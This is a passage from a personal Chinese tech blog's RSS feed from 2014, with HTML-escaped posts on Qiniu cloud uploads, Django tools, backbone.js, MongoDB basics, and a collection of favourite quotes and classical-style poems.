&lt;h2&gt;上传流程&lt;/h2&gt;
&lt;h3&gt;在七牛云存储中，整个上传流程大体分为这样几步：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;业务服务器颁发 uptoken（上传授权凭证）给客户端（终端用户）&lt;/li&gt;
&lt;li&gt;客户端凭借 uptoken 上传文件到七牛&lt;/li&gt;
&lt;li&gt;在七牛获得完整数据后，发起一个 HTTP 请求回调到业务服务器&lt;/li&gt;
&lt;li&gt;业务服务器保存相关信息，并返回一些信息给七牛&lt;/li&gt;
&lt;li&gt;七牛原封不动地将这些信息转发给客户端（终端用户）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;如果上传发生在业务服务器，以上流程可以自然简化为：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;业务服务器生成 uptoken（不设置回调，自己回调到自己这里没有意义）&lt;/li&gt;
&lt;li&gt;凭借 uptoken 上传文件到七牛&lt;/li&gt;
&lt;li&gt;善后工作，比如保存相关的一些信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;demo&lt;/h2&gt;
&lt;p&gt;官方给了一个&lt;a href="https://github.com/qiniu/python-sdk/blob/develop/docs/gist/demo.py"&gt;代码片段&lt;/a&gt;，其实包含了大多使用场景.&lt;br /&gt;
需要注意的是首先设置环境变量。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;os.environ[&amp;#39;QINIU_ACCESS_KEY&amp;#39;] = &amp;quot;xx&amp;quot;
os.environ[&amp;#39;QINIU_SECRET_KEY&amp;#39;] = &amp;quot;xx&amp;quot;
os.environ[&amp;#39;QINIU_TEST_BUCKET&amp;#39;] = &amp;quot;xx&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后可以在ipython中实验各个函数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;demo&lt;/span&gt;
&lt;span class="n"&gt;demo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_setup&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;demo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put_file&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;在django中使用&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/piglei/django-qiniu"&gt;django-qiniu&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Save your uploaded file in views.py&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/piglei/django-qiniu#2-save-your-uploaded-file-in-viewspy"&gt;views.py&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/qiniu/python-sdk/tree/develop/docs"&gt;Python SDK 使用指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 30 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-30:qiniu.html</guid><category>python</category></item><item><title>一些django工具笔记</title><link>/django-tools.html</link><description>&lt;h2&gt;&lt;a href="https://github.com/django-debug-toolbar/django-debug-toolbar"&gt;django-debug-toolbar&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;关于&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A configurable set of panels that display various debug information about the current request/response.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;django调试不二神器&lt;/p&gt;
&lt;h3&gt;配置&lt;/h3&gt;
&lt;p&gt;0.10.0版的配置，edx可用&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;DEBUG_TOOLBAR_PANELS = (
    &amp;#39;debug_toolbar.panels.version.VersionDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.timer.TimerDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.settings_vars.SettingsVarsDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.headers.HeaderDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.request_vars.RequestVarsDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.template.TemplateDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.sql.SQLDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.signals.SignalDebugPanel&amp;#39;,
    &amp;#39;debug_toolbar.panels.logger.LoggingPanel&amp;#39;,
)
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://github.com/django-extensions/django-extensions"&gt;django-extensions&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;关于&lt;/h3&gt;
&lt;p&gt;Django Extensions 是Django框架的扩展功能集合.&lt;br /&gt;
包括management命令扩展,数据库字段扩展,admin后台扩展等.&lt;/p&gt;
&lt;h3&gt;&lt;a href="http://django-extensions-zh.readthedocs.org/zh_CN/latest/command_extensions.html"&gt;常用扩展命令列表&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;shell_plus.运行Django shell的同时自动加载所有app的models&lt;/li&gt;
&lt;li&gt;$ ./manage.py shell_plus --use-ipython&lt;/li&gt;
&lt;li&gt;create_jobs - 在指定app内创建一个定时任务扩展目录,可以定期执行指定任务.&lt;/li&gt;
&lt;li&gt;dumpscript - 生成一个Python脚本.包含指定app的所有数据对象.与Django的 dumpdata 命令不同的是 dumpscript 导出的是Python对象,而不是纯数据.这种导出数据的方式比直接导出数据或XML文件更容易理解,也更灵活.&lt;/li&gt;
&lt;li&gt;graph_models - 生成一个 GraphViz 文件.将输出内容写入一个文件.以图形化数据模型.传入多个app的名字作为参数,可以在一个文件中显示多个模型的图形化格式&lt;/li&gt;
&lt;li&gt;mail_debug - 开启一个邮件服务,将Django项目发出的邮件从控制台输出,而不是真的发送出去.&lt;/li&gt;
&lt;li&gt;passwd - 重新设定某个用户的密码,用法: ./manage.py passwd [用户名] .&lt;/li&gt;
&lt;li&gt;print_settings - 与 diffsettings 命令功能类似,但会根据参数显示指定的配置，如果不传参数默认显示的全部配置.&lt;/li&gt;
&lt;li&gt;print_user_for_session - 通过 session key 来查看当前用户信息,这个方法在查找哪个用户行为导致程序异常非常有帮助.&lt;/li&gt;
&lt;li&gt;reset_db - 重置数据库 (目前支持 sqlite3, mysql, postgres)，可以用来删除或创建数据库.&lt;/li&gt;
&lt;li&gt;runjobs - 执行计划任务. 分为按小时执行,按天执行,按周执行,按月执行.是 django-extensions 任务系统中的一部分功能.&lt;/li&gt;
&lt;li&gt;runprofileserver - 在启动 runserver 测试服务的同时,其用 profile 功能,可以记录服务的详细日志,包含了对于Python方法的详细执行分析.在服务器性能分析时,这是最佳方法了.&lt;/li&gt;
&lt;li&gt;runserver_plus - 在Werkzeug debugger模式下开启服务. 需要安装 Werkzeug.这是个杀手级应用.&lt;/li&gt;
&lt;li&gt;show_urls - 统一显示项目中包含的所有url.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/toastdriven/django-haystack"&gt;django-haystack&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;关于&lt;/h3&gt;
&lt;p&gt;Django-haystack应该是Django集成全文检索引擎的最佳选择了，haystack提供了一套非常优雅灵活易用的API， 就像Django本身的ORM/QuerySet一样，使索引、搜索工作大大简化。&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://django-debug-toolbar.readthedocs.org/en/1.2/installation.html"&gt;django-debug-toolbar doc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://django-extensions-zh.readthedocs.org/zh_CN/latest/"&gt;django-extensions 文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/wenxuansoft/article/details/8172766"&gt;实现Django的全文检索功能（三）：进一步学习Haystack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 28 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-28:django-tools.html</guid><category>django</category></item><item><title>backbone.js学习笔记</title><link>/learn-backbone.html</link><description>&lt;p&gt;最近准备为edx的课程做扩展，赋予它更多属性，发现课程的数据模型不是用django的model来定义的。一路追踪下来，发现自己一直思维定式在django的逻辑上，总是希望能够追踪到views。&lt;/p&gt;
&lt;p&gt;而实际上大多逻辑都移到了前端，edx使用了&lt;a href="https://github.com/edx/edx-platform/blob/master/cms/static/js/models/settings/course_details.js#L1"&gt;backbone.js&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;所以开始折腾&lt;a href="https://github.com/jashkenas/backbone"&gt;backbone.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其实之前都有断断续续学过一段时间&lt;a href="https://github.com/jashkenas/backbone"&gt;backbone.js&lt;/a&gt;，甚至&lt;a href="https://github.com/angular/angular.js"&gt;angular.js&lt;/a&gt;,没有做些练手项目，终究觉得边看边忘。终于有机会好好学习。一鼓作气～&lt;/p&gt;
&lt;p&gt;waiting&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.the5fire.com/tag/backbone/"&gt;Backbonejs入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/the5fire/backbonejs-learning-note"&gt;Backbone.js入门教程第二版&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://feliving.github.io/developing-backbone-applications/"&gt;Developing Backbone.js Applications(中文版)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 23 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-23:learn-backbone.html</guid><category>edx</category></item><item><title>收藏有趣的言论/见解/观点</title><link>/favorites.html</link><description>&lt;h2&gt;网络&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;唯情怀与梦想不可辜负&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“什么是爱？爱一个人是什么感觉？”  “好像突然有了软肋，也突然有了铠甲，”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;smart is the new sexy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;以大多数人的努力程度之低，根本轮不到拼天赋&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你的问题不是读的书少，而是读的好书太少&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;阅读&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对有志青年来说，发疯是多么灿烂的事情简直是义不容辞。  --刘瑜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我一翻开他的书，就好像长出了一对翅膀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对爱情的渴望，对知识的追求，对人类苦难不可遏制的同情，是支配我一生的单纯而强烈的三种感情  --罗素&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们把这个世界变为地狱的原因,恰是我们想把它建设为天堂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人类中的大部分只是没死，而不是生活&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;怀才不遇，逆水行舟，一个人就像一支队伍，对着自己的头脑和心灵招兵买马，不气馁，有召唤，爱自由。 --刘瑜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果要给美好的人生一个定义，那就是惬意。如果要给惬意一个定义，那就是三五知己，谈笑风生。  --刘瑜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你的问题主要是读书不多而想得太多 --杨绛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;编程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果建筑工人像程序员写软件那样盖房子，那第一只飞来的啄木鸟就能毁掉人类文明&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件和教堂非常相似——建成之后我们就在祈祷&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果没能一次成功，那就叫它1.0版吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所有的程序员都是编剧，所有的计算机都是烂演员&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么我们没有时间把事情做对，却总有时间把事情做过头？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;傻瓜都能写出计算机能理解的程序。优秀的程序员写出的是人类能读懂的代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;按代码行数来评估软件开发的进度，就如同按重量来评估飞机建造的进度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件就像做爱。一次犯错，你需要用余下一生来维护支持&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最初90%的代码用去了最初90%的开发时间…余下10%的代码用去了另外90%的开发时间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;注释代码很像清洁你的厕所——你不想干，但如果你做了，这绝对会给你和你的客人带来更愉悦的体验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件设计最困难的部分…是阻挡新功能的引入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;理论上，理论和实践是没有差异的。但实践中，是有的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;培养员工，即使他们有跳槽的风险。什么都不做而留他们在公司，这样风险更大。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一种新技术一旦开始流行，你要么坐上压路机，要么成为铺路石&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;程序必须是为了给人看而写，给机器去执行只是附带任务&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果纠错是消除软件bug的过程，那编程一定是把它们放进去的过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这不是个bug——这一个未注明的功能特征&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Talk is cheap. Show me the code  --linus&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;诗词&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;此夜氛围宜薄醉，经旬况味莫详询&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;吾生何事最堪喜，雪夜拥炉读禁书。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一心甫动即追攀，访戴何须雪满山&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中年酒病浑无药，掩卷诗成最忆君&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;百劫寻常添一病，平生咫尺负三春。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一自残荷凋晚霜，旧年人物散钱塘。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;雋骨消磨我見哀，勸君珍重妙華才。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;浮名在网虚谁辨，事大如山拔线休。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;长安目极一山横，如海从谁问姓名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;六龙车驾逃夸父，十载芙蓉看锦城。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;细雨停时双折伞，凭君一笑解春愁。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;晚岁犹思前女友，当时谁料老空床。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;平居无事诗难大，每向荒唐气转真。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;怜君包养终无计，恨我买山犹少赀。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;秋風葉上清商起，桂子天香漸滿廊。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;细雨楼头曾待月，于谁枕上梦飞花&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;惭我新年多懈怠，徒增岁月在腰肢。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;今我来兮桨不起，秦淮脂褪水如蓝。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;醉心听段雨，无事泡杯茶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;荧屏声掩心跳夜，爱火花开指触时。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;终去也，梨花白，柳花轻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;差可卧云听月，闲对半床书。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;了却闲情误早梅，一时相见已成灰。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;盘鸥窥远客，困犊卧斜阳&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一窗凉近居临水，半阁灯悬知有山&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;卧水石根青有瑕，苍烟藏住野人家。春山暮冷客披霞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;白眼寒如剑，青眼媚如星。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;欲起佛山无影脚，暴殴天马流星拳。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;约携新橘酒，去踏远山云。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知君闲暇少，我亦故人稀。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;才恨花开迟，复恨花开早&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中年格调愈清奇，诗不能工一笑之&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;春寒甚晚。似得人一瑟，忘其裙短。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;思人最是清明雨，一棹烟波过谢桥。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;山光似有停云绿，句到唇边转忆兄。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;窈窕背影休欺我，饕餮谁人不识君&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;饶吾世故可饶君&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从今许各安天命，生不相逢死不闻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;将半帙南国香词，做一夕西窗闲话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;雨涨泥塘青草路。人归暮色故庐烟。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知己论交一夔足，仇雠肯赠故人头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;君又未来花又落，杜鹃啼暮百千山。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 19 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-19:favorites.html</guid><category>随笔</category></item><item><title>mongo学习笔记</title><link>/learn-mongo.html</link><description>&lt;p&gt;edx生产环境使用了mongo数据库。&lt;/p&gt;
&lt;p&gt;对mongo数据库垂涎已久，其高性能/开源/无模式/文档型数据库/...多么诱人的特性，之前也偶尔折腾着玩过，不过都没做笔记，趁此机会重新捡起来。&lt;/p&gt;
&lt;h2&gt;关于mongo&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;MongoDB is an open-source document database that provides high performance, high availability, and automatic scaling.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;mongo支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能&lt;/p&gt;
&lt;p&gt;&lt;img alt="a-mongo-document" src="http://wwjpic.qiniudn.com/mongo-document.png" /&gt;&lt;/p&gt;
&lt;h2&gt;mongo是一种NoSql数据库&lt;/h2&gt;
&lt;p&gt;NoSql，全称是 Not Only Sql,指的是非关系型的数据库。主要解决几个要点：非关系型的、分布式的、开源的、水平可扩展的。原始的目的是为了大规模web应用。通常特性应用如：模式自由、支持简易复制、简单的API、最终的一致性（非ACID）、大容量数据等。NoSQL被我们用得最多的当数key-value存储。&lt;/p&gt;
&lt;h3&gt;mongo特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;模式自由。&lt;/li&gt;
&lt;li&gt;支持动态查询。&lt;/li&gt;
&lt;li&gt;支持完全索引，包含内部对象。&lt;/li&gt;
&lt;li&gt;支持查询。&lt;/li&gt;
&lt;li&gt;支持复制和故障恢复。&lt;/li&gt;
&lt;li&gt;文件存储格式为BSON（一种JSON的扩展）。&lt;/li&gt;
&lt;li&gt;可通过网络访问。&lt;/li&gt;
&lt;li&gt;支持Python，PHP，Ruby，Java，C，C#，Javascript，Perl及C++语言的驱动程序&lt;/li&gt;
&lt;li&gt;使用高效的二进制数据存储，包括大型对象（如视频等）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;软件即服务&lt;/h2&gt;
&lt;p&gt;将mongo当做一个服务，通过接口CRUD我们的数据。&lt;/p&gt;
&lt;p&gt;对于不同用户角色，对mongo所需的了解方面是不同的，我们的角色是Developers，我们主要将它作为服务来使用。&lt;/p&gt;
&lt;p&gt;细节可以参考&lt;a href="http://docs.mongodb.org/manual/reference/"&gt;reference&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而作为python开发者，我们使用mongo的&lt;a href="http://docs.mongodb.org/ecosystem/drivers/python/"&gt;python驱动&lt;/a&gt;来CRUD数据&lt;/p&gt;
&lt;p&gt;&lt;img alt="mongo-use" src="http://wwjpic.qiniudn.com/mongo-use.png" /&gt;&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;ubuntu下安装mongo比较简单，直接&lt;code&gt;sudo apt-get install mongodb&lt;/code&gt;就行。&lt;/p&gt;
&lt;p&gt;当然也可以去&lt;a href="http://www.mongodb.org/downloads"&gt;官网下载安装&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;端口号是&lt;code&gt;27017&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进入mongo shell:&lt;code&gt;mongo&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;基础&lt;/h2&gt;
&lt;h3&gt;6个简单的概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;MongoDB有着与您熟知的‘数据库’一样的概念。每一个数据库都是高层次的容器，用来储存其他的所有数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个数据库可以有若干‘集合’（collection）。集合和传统概念中的‘表’有着足够多的共同点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;集合由若干‘文档’（document）组成,可以认为这里的文档就是‘行’。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文档又由若干‘域’（field）组成，域就像是‘列’。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;索引&lt;/code&gt;（index）在MongoDB中的意义就如同索引在RDBMS中一样。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;游标&lt;/code&gt;（cursor）和以上5个概念不同.每当向MongoDB索要数据时，它总是返回一个游标。基于游标我们可以作诸如计数或是直接跳过之类的操作，而不需要真正去读数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;小结一下，MongoDB由&lt;code&gt;数据库&lt;/code&gt;组成，数据库由&lt;code&gt;集合&lt;/code&gt;组成，集合由&lt;code&gt;文档&lt;/code&gt;组成。&lt;code&gt;域&lt;/code&gt;组成了文档，集合可以被&lt;code&gt;索引&lt;/code&gt;，从而提高了查找和排序的性能。最后，我们从MongoDB读取数据的时候是通过&lt;code&gt;游标&lt;/code&gt;进行的，除非需要，游标不会真正去作读的操作。&lt;/p&gt;
